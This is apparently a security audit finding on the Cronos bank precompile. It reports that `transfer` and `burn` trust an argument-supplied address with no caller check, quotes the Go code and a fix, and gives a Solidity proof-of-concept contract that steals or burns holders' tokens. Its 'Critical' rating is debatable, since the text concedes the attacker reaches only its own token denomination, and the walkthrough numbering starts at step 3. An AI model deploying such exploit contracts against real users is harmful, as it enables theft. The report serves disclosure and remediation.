### Title
Missing Caller Authorization in Bank Precompile `transfer` and `burn` Allows Any Contract to Move or Destroy Arbitrary Holders' Native Tokens - (File: x/cronos/keeper/precompiles/bank.go)

---

### Summary

The bank precompile's `transfer` and `burn` dispatch paths accept the `sender`/`recipient` address as a plain ABI argument and never verify it equals `contract.Caller()`. Any EVM contract can therefore invoke these methods with an arbitrary victim address, unconditionally moving or destroying `evm/<calling_contract>` denomination tokens held by that victim in the native bank module — without the victim's consent and without any authorization check.

---

### Finding Description

`BankContract.Run` in `x/cronos/keeper/precompiles/bank.go` handles three state-mutating methods. For `mint`, the caller is implicitly the authority (it mints its own denomination to a recipient, which is fine). For `transfer` and `burn`, however, the address that tokens are debited from is read directly from the ABI-decoded arguments, not from `contract.Caller()`:

**`transfer` path (lines 175–192):**
```go
sender := args[0].(common.Address)   // ← attacker-controlled, never validated
recipient := args[1].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
...
denom := EVMDenom(contract.Caller())  // denom = "evm/<calling_contract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

**`burn` path (lines 121–144):**
```go
recipient := args[0].(common.Address) // ← attacker-controlled, never validated
...
addr := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

In both cases there is no guard of the form `if sender != contract.Caller() { return error }`. The denomination is scoped to the calling contract (`evm/<contract.Caller()>`), so the attacker can only affect tokens under their own contract's denomination — but that is precisely the denomination they control and can distribute to users.

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled native bank assets.**

Any EVM contract can:
1. Call `transfer(victimAddr, attackerAddr, amount)` on the bank precompile → `SendCoins` moves `evm/<contract>` tokens from `victim` to `attacker` with no consent check.
2. Call `burn(victimAddr, amount)` on the bank precompile → `SendCoinsFromAccountToModule` + `BurnCoins` destroys `evm/<contract>` tokens held by `victim` with no consent check.

This maps directly to the allowed Critical impact: *"Unauthorized… transfer… burn… balance/accounting change for… precompile-controlled assets."*

---

### Likelihood Explanation

The bank precompile is reachable by any deployed EVM contract with no privilege requirement. The attacker only needs to:
- Deploy a contract (permissionless on Cronos EVM).
- Distribute `evm/<contract>` tokens to users (via the `mint` path, which is intentionally open).
- Call `transfer` or `burn` with victim addresses to drain or destroy those balances at will.

No admin key, governance vote, or leaked secret is required.

---

### Recommendation

Add a caller-equality guard at the top of both the `transfer` and `burn` dispatch branches:

```go
// transfer
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be caller")
}

// burn
if recipient != contract.Caller() {
    return nil, errors.New("burn: recipient must be caller")
}
```

This mirrors the pattern already used in `precompiles/utils.go` (`exec`), which explicitly checks `caller != e.caller` before executing any native action.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
}

contract BankPrecompileExploit {
    IBankPrecompile constant bank = IBankPrecompile(address(0x64)); // 0x0000...0064

    // Step 1: attacker mints evm/<this> tokens to victim (legitimate-looking airdrop)
    // Step 2: attacker calls this to steal them back
    function stealFrom(address victim, address attacker, uint256 amount) external {
        // transfers evm/<address(this)> tokens from victim → attacker
        // no authorization check in the precompile
        bank.transfer(victim, attacker, amount);
    }

    // OR: destroy victim's balance entirely
    function burnFrom(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

3. Calls `stealFrom(victim, attacker_eoa, 1000)` → bank precompile executes `SendCoins(victim → attacker_eoa, 1000 evm/0xEXPL)` with no authorization check.
4. Victim's balance is zero; attacker holds 1000 `evm/0xEXPL` tokens — transferred without victim's consent.
